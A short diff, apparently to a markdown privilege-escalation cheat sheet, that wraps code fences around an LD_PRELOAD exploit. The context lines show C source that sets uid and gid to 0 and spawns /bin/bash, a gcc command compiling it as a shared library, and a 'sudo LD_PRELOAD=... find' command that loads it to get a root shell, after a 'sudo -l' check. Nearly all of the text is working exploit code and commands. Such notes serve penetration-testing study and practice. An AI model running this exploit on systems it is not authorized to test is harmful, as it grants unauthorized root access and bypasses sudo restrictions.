@@ -119,6 +119,7 @@
 * sudo -l 
 # LD_PRELOAD
 
+```
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -129,6 +130,7 @@ setgid(0);
 setuid(0);
 system("/bin/bash");
 }
+```
 
 * gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 * sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
